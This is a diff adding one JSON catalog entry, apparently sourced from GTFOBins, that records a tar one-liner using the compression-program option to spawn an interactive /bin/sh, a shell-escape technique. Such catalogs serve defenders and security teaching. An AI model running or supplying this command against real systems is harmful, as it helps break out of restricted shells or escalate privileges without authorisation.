@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-tar-shell-2",
+  "name": "GTFOBins · tar (shell) #2",
+  "command": "tar xf /dev/null -I '/bin/sh -c \"/bin/sh 0<&2 1>&2\"'",
+  "description": "Use tar to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "tar",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/tar/#shell",
+  "upstream_id": "tar/shell/1",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/tar/"
+    }
+  ]
+}
